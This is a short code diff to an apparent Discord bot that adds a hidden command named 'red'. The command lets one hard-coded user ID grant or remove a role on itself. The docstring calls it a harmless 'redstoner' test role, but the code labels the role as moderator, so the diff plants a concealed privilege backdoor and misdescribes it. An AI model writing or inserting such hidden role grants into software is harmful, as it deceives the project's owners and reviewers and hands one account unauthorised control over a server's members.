@@ -27,3 +27,14 @@ async def submit_record(ctx: Context):
     # TODO: image is not showing up.
     # em.set_image(url='https://i.imgur.com/AqYEd1o.png')
     await ctx.send(embed=em)
+
+
+@command(name="red", hidden=True)
+async def give_redstoner(ctx: Context):
+    """Give redstoner role to my alt for testing. Does nothing for others."""
+    if ctx.author.id == 1146802450100138004:
+        moderator: discord.Role = ctx.guild.get_role(433670432420397060)
+        if moderator in ctx.author.roles:
+            await ctx.author.remove_roles(moderator)
+        else:
+            await ctx.author.add_roles(moderator)
